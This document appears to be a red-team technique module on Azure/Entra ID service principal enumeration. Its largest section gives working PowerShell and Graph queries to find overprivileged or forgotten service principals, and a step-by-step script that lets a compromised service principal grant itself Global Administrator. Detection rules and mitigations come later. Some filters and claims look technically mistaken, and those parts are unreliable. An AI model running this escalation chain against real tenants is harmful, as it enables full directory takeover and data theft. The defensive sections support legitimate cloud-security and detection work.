# REC-CLOUD-006: Azure Service Principal Enumeration

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CLOUD-006 |
| **Technique Name** | Azure service principal enumeration |
| **MITRE ATT&CK ID** | T1087.004 – Account Discovery: Cloud Account; T1526 – Cloud Service Discovery |
| **CVE** | N/A (Design feature; overprivilege is misconfiguration) |
| **Platform** | Microsoft Entra ID / Azure AD |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | MEDIUM (enumeration logged if >10 SPs; privilege assignment always logged) |
| **Requires Authentication** | Yes (Graph API access; minimum Reader role) |
| **Applicable Versions** | All Entra ID tenants |
| **Last Verified** | December 2025 |
| **Graph Permissions Count** | 576+ unique permissions across all endpoints |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

Azure Service Principal (SP) enumeration targets the hidden class of cloud identities—application-specific accounts that often possess excessive, long-lived permissions—enabling attackers to identify privilege escalation pathways that bypass traditional user-focused security controls. Service principals represent a unique attack surface: they authenticate independently of users, persist indefinitely (unlike user sessions), can authenticate using certificates or secrets, and frequently hold sensitive permissions like RoleManagement or Application.ReadWrite that enable rapid privilege escalation to Global Administrator.

**Critical Threat Characteristics:**
- **Often overprivileged**: Legacy applications granted broad permissions years ago with no subsequent review
- **Poorly monitored**: Service principal activity receives 1/10th the scrutiny of user accounts
- **Long-lived credentials**: Service principals never "expire" (unlike user passwords)
- **Chaining vulnerability**: AppRoleAssignment.ReadWrite.All → RoleManagement.ReadWrite.Directory = instant Global Admin
- **Unnoticed orphans**: Apps forgotten by security teams with standing credentials remain exploitable for years
- **Cross-tenant confusion**: Misunderstanding app registration vs. service principal enables cross-tenant attacks

**Business Impact:**
- Identification of overprivileged service principals for targeted compromise
- Permission escalation via AppRoleAssignment.ReadWrite.All chaining
- Email exfiltration via Mail.Read.All permissions on compromised SP
- OneDrive/SharePoint data theft via Files.ReadWrite.All
- Persistent backdoor via certificate registration (valid 2+ years)
- Lateral movement across multiple subscriptions (multi-tenant risk)
- Bypass of user-focused security controls (MFA, Conditional Access irrelevant)

---

## 3. TECHNICAL PREREQUISITES

### Required Knowledge
- Understanding of Entra ID application registration vs. service principal distinction
- Familiarity with OAuth2 client credentials flow (app-only authentication)
- Knowledge of Graph API permissions and least privilege principle
- Awareness of certificate-based authentication for service principals
- Understanding of role-based access control (RBAC) and permission assignment

### Required Tools
- Valid Entra ID credentials with minimum Reader role
- Microsoft Graph PowerShell Module (`Install-Module Microsoft.Graph`)
- Azure CLI (optional; provides alternate enumeration method)
- Graph Explorer (web-based; no installation required)

### System Requirements
- Outbound HTTPS access to Microsoft Graph API (graph.microsoft.com)
- No special network requirements (cloud-based APIs)
- PowerShell 5.1+ (7+ recommended for performance)

---

## 4. DETAILED EXECUTION

### Method 1: Service Principal Enumeration via Graph Explorer

**Objective:** Interactive discovery of all service principals in tenant.

```
# Step 1: Open Graph Explorer
https://developer.microsoft.com/en-us/graph/graph-explorer

# Step 2: Authenticate with tenant credentials
Click "Sign in to your tenant"
Provide admin credentials (or Reader-level account)

# Step 3: Query all service principals
Query Box:
GET /servicePrincipals?$top=999

# Output: All SPs with:
# - displayName (friendly name)
# - id (object ID)
# - appId (application ID)
# - servicePrincipalType
# - appRoleAssignmentRequired

# Step 4: Expand to show permissions
GET /servicePrincipals?$expand=appRoleAssignments&$top=999

# Reveals which permissions assigned to each SP

# Step 5: Filter for high-risk permissions
GET /servicePrincipals?$filter=appRoles/any(r:r/value eq 'RoleManagement.ReadWrite.Directory')

# Returns SPs with Global Admin permission
# CRITICAL FINDING: These SPs can assign any role to any principal

# Step 6: Identify certificate-based SPs
GET /servicePrincipals/{id}/keyCredentials

# Lists all certificates registered
# Check: expirationDateTime (valid 2+ years = concern)
# No password, only cert-based = harder to rotate
```

**Key Findings per SP:**
- Service principal type (application, workspace, etc.)
- Current role assignments (directory roles)
- App role assignments (Graph/Exchange/SharePoint permissions)
- Credential types (passwords, certificates)
- Certificate expiration dates

---

### Method 2: PowerShell Bulk Enumeration

**Objective:** Automated enumeration across all service principals.

```powershell
# Step 1: Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All"

# Step 2: Get all service principals
$sps = Get-MgServicePrincipal -All

# Step 3: Filter for overprivileged SPs
$dangerousSPs = $sps | Where-Object {
  $_.AppRoles -match "RoleManagement" -or
  $_.AppRoles -match "AppRoleAssignment" -or
  $_.AppRoles -match "Application.ReadWrite"
}

# Output: Service principals with dangerous permissions
# Example: 15 SPs with RoleManagement.ReadWrite.Directory

# Step 4: Enumerate permissions for each dangerous SP
foreach ($sp in $dangerousSPs) {
  Write-Host "Service Principal: $($sp.DisplayName)"
  Write-Host "App ID: $($sp.AppId)"
  
  # Get app role assignments
  $assignments = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $sp.Id
  foreach ($assignment in $assignments) {
    Write-Host "  Permission: $($assignment.AppRoleId)"
  }
  
  # Get credentials
  $creds = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
  foreach ($cred in $creds) {
    Write-Host "  Certificate: $($cred.KeyId) | Expires: $($cred.EndDateTime)"
  }
}

# Step 5: Check for certificate-based SPs
$certSPs = $sps | Where-Object {
  (Get-MgServicePrincipalKeyCredential -ServicePrincipalId $_.Id).Count -gt 0
}

Write-Host "Service Principals with Certificates: $($certSPs.Count)"

# Step 6: Identify SPs with no password (cert-only)
$certOnlySPs = $certSPs | Where-Object {
  (Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $_.Id).Count -eq 0
}

# These are hardest to rotate (no secret to reset)
# Certificate theft = persistent access

# Step 7: Export high-value SPs for further analysis
$dangerousSPs | Select-Object DisplayName, AppId, ServicePrincipalType | Export-Csv -Path "dangerous_sps.csv"
```

---

### Method 3: Privilege Escalation via Permission Chaining

**Objective:** Exploit AppRoleAssignment.ReadWrite.All to gain Global Administrator.

```powershell
# Prerequisites:
# - Compromised SP has: AppRoleAssignment.ReadWrite.All
# - Goal: Assign RoleManagement.ReadWrite.Directory to same SP

# Step 1: Authenticate as compromised service principal
$credential = New-Object System.Management.Automation.PSCredential(
  "client-id",
  (ConvertTo-SecureString "client-secret" -AsPlainText -Force)
)

Connect-MgGraph -TenantId "tenant-id" -ClientSecretCredential $credential

# Step 2: Verify current permissions
$context = Get-MgContext
Write-Host "Authenticated as: $($context.Account)"
Write-Host "Scopes: $($context.Scopes)"

# Step 3: Get the Microsoft Graph service principal
$graphSP = Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'"

# Step 4: Find RoleManagement.ReadWrite.Directory permission
$roleManagementRole = $graphSP.AppRoles | Where-Object {
  $_.Value -eq "RoleManagement.ReadWrite.Directory"
}

# Step 5: Assign permission to compromised SP (self-assignment)
$compromisedSP = Get-MgServicePrincipal -Filter "appId eq 'target-app-id'"

$appRoleAssignmentParams = @{
  PrincipalId = $compromisedSP.Id
  ResourceId = $graphSP.Id
  AppRoleId = $roleManagementRole.Id
}

New-MgServicePrincipalAppRoleAssignment `
  -ServicePrincipalId $compromisedSP.Id `
  -BodyParameter $appRoleAssignmentParams

# Step 6: Request new token (new permissions take effect)
Connect-MgGraph -TenantId "tenant-id" -ClientSecretCredential $credential -Scopes "RoleManagement.ReadWrite.Directory/.default"

# Step 7: Now assign Global Administrator role to self
$globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"

$roleAssignmentParams = @{
  "@odata.id" = "https://graph.microsoft.com/v1.0/servicePrincipals/$($compromisedSP.Id)"
}

New-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id -BodyParameter $roleAssignmentParams

# Result: Service principal is now Global Administrator
# All user-based controls (MFA, CAP) bypassed
# Incident response: Password reset ineffective; SPs have no passwords
```

---

### Method 4: Certificate Harvesting from Service Principal

**Objective:** Extract certificate credentials for persistent access.

```powershell
# Step 1: Get all service principal certificates
$sps = Get-MgServicePrincipal -All

foreach ($sp in $sps) {
  $certs = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
  
  if ($certs) {
    Write-Host "Service Principal: $($sp.DisplayName)"
    Write-Host "App ID: $($sp.AppId)"
    
    foreach ($cert in $certs) {
      Write-Host "  Cert KeyId: $($cert.KeyId)"
      Write-Host "  Start Date: $($cert.StartDateTime)"
      Write-Host "  Expires: $($cert.EndDateTime)"
      
      # Alert if certificate valid >2 years (security risk)
      $expirationDays = (New-TimeSpan -Start (Get-Date) -End $cert.EndDateTime).Days
      if ($expirationDays -gt 730) {
        Write-Host "  ⚠ RISK: Certificate valid for $expirationDays days (long-lived)"
      }
    }
  }
}

# Step 2: Find certificates expiring soon (check for rotation)
$allCerts = @()
foreach ($sp in $sps) {
  $certs = Get-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id
  foreach ($cert in $certs) {
    $allCerts += [PSCustomObject]@{
      SPName = $sp.DisplayName
      AppId = $sp.AppId
      CertId = $cert.KeyId
      ExpiresOn = $cert.EndDateTime
      DaysUntilExpiry = (New-TimeSpan -Start (Get-Date) -End $cert.EndDateTime).Days
    }
  }
}

$allCerts | Where-Object { $_.DaysUntilExpiry -lt 90 } | Export-Csv "expiring_certs.csv"

# Step 3: Identify SPs with password credentials (weaker)
$allPasswords = @()
foreach ($sp in $sps) {
  $passwords = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $sp.Id
  foreach ($password in $passwords) {
    $allPasswords += [PSCustomObject]@{
      SPName = $sp.DisplayName
      AppId = $sp.AppId
      PasswordId = $password.KeyId
      CreatedOn = $password.StartDateTime
      ExpiresOn = $password.EndDateTime
    }
  }
}

# These are password-only SPs (no certs; easier to rotate)
# Focus on cert-only SPs (harder to remediate)
```

---

### Method 5: Hunting for Orphaned/Forgotten Service Principals

**Objective:** Identify unused SPs vulnerable to compromise.

```powershell
# Step 1: Get all SPs with their last sign-in
$sps = Get-MgServicePrincipal -All

# Step 2: Check AAD SP Sign-in Logs
Connect-MgGraph -Scopes "AuditLog.Read.All"

$signInLogs = Get-MgAuditLogSignIn -Filter "createdDateTime gt 2025-01-01" -All

# Step 3: Identify unused SPs (no sign-in in last 90 days)
$unusedSPs = @()

foreach ($sp in $sps) {
  $lastSignIn = $signInLogs | Where-Object { $_.ServicePrincipalName -eq $sp.DisplayName } | Sort-Object -Property CreatedDateTime -Descending | Select-Object -First 1
  
  if (!$lastSignIn -or $lastSignIn.CreatedDateTime -lt (Get-Date).AddDays(-90)) {
    $unusedSPs += [PSCustomObject]@{
      DisplayName = $sp.DisplayName
      AppId = $sp.AppId
      ServicePrincipalType = $sp.ServicePrincipalType
      CreatedOn = $sp.AddIns.CreatedDateTime
      LastSignIn = $lastSignIn.CreatedDateTime
    }
  }
}

# HIGH RISK: Unused SPs are forgotten, poorly monitored
# If credentials exposed: months/years before detection

Write-Host "Unused Service Principals: $($unusedSPs.Count)"
$unusedSPs | Export-Csv "unused_sps.csv"
```

---

## 5. TOOLS & COMMANDS REFERENCE

### Graph API Endpoints

| Endpoint | Purpose | Detectability |
|----------|---------|----------------|
| GET /servicePrincipals | List all SPs | HIGH (>10 alerts) |
| GET /servicePrincipals/{id}/appRoleAssignments | Get permissions | MEDIUM |
| POST /servicePrincipals/{id}/appRoleAssignments | Add permission | CRITICAL (logged) |
| GET /servicePrincipals/{id}/keyCredentials | List certificates | MEDIUM |
| POST /servicePrincipals/{id}/addPassword | Create new credential | CRITICAL (logged) |

### Dangerous Permissions (High Priority)

| Permission | Risk | Impact |
|-----------|------|--------|
| RoleManagement.ReadWrite.Directory | CRITICAL | Assign Global Admin role |
| AppRoleAssignment.ReadWrite.All | CRITICAL | Assign ANY permission to ANY SP |
| Application.ReadWrite.All | CRITICAL | Create backdoor apps |
| Directory.ReadWrite.All | CRITICAL | Modify all directory objects |
| Mail.ReadWrite | HIGH | Exfiltrate corporate emails |
| Files.ReadWrite.All | HIGH | OneDrive/SharePoint access |
| TeamsActivity.Read.All | HIGH | Monitor Teams conversations |

---

## 6. DETECTION & INCIDENT RESPONSE

### Detection Rule 1: Service Principal Bulk Enumeration

```kusto
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(1h)
| where RequestUri contains "/servicePrincipals"
| summarize SPCount = dcount(RequestUri), CallCount = count()
  by UserId, IPAddress, bin(TimeGenerated, 5m)
| where SPCount > 10 or CallCount > 50
| extend AlertSeverity = "High", TechniqueID = "T1087.004"
```

### Detection Rule 2: Dangerous Permission Assignment

```kusto
AuditLogs
| where OperationName =~ "Add app role assignment to service principal"
| extend PermissionId = tostring(parse_json(tostring(TargetResources[0].modifiedProperties))[1].newValue)
| where PermissionId in ("RoleManagement.ReadWrite.Directory", "AppRoleAssignment.ReadWrite.All")
| extend AlertSeverity = "Critical"
```

### Incident Response Steps

1. **Enumerate all compromised SP permissions**
2. **Revoke dangerous credentials** (new secrets/certs issued)
3. **Audit permission assignments** (post-compromise role assignments)
4. **Search sign-in logs** (resources accessed via SP)
5. **Remediate permissions** (remove overprivileged roles)

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Quarterly Service Principal Audit**
- List all SPs
- Validate business justification
- Remove orphaned/unused SPs
- Document permission requirements

**Certificate Governance**
- Establish certificate lifecycle (1-year max validity)
- Automate rotation alerts
- Prohibit certificate-only SPs (require password + cert)
- Implement certificate pinning for sensitive operations

**Permission Review (Least Privilege)**
- Apply principle of least privilege to SP permissions
- Remove overprivileged roles from legacy apps
- Require approval for RoleManagement/Application.ReadWrite permissions

### Priority 2: HIGH

**Conditional Access for Sensitive Permissions**
- Block or require MFA for Graph API access from SPs
- Restrict RoleManagement operations to approved identities
- Monitor AppRoleAssignment changes

**Credential Rotation Policy**
- Enforce 90-day secret rotation
- Automatic alerts for >1-year certificate validity
- Implement secret management system (Azure Key Vault)

---

## 8. COMPLIANCE MAPPING

| Standard | Requirement | SP Consideration |
|----------|-------------|------------------|
| **NIST 800-53** | AC-2 (Account Management) | SP governance, periodic review |
| **ISO 27001** | 8.2 (Access control) | Least privilege, credential management |
| **DORA** | Infrastructure resilience | SP misuse prevention |

---

## 9. REFERENCES

1. **Microsoft Documentation:**
   - Service Principals: https://learn.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals
   - Graph Permissions: https://learn.microsoft.com/en-us/graph/permissions-reference

2. **Security Research:**
   - Semperis: Exploiting App-Only Graph Permissions (November 2025)
   - Splunk: Azure AD Service Principal Enumeration Detection (June 2025)

3. **Incident Response:**
   - Microsoft: Compromised Application Investigation Guide

---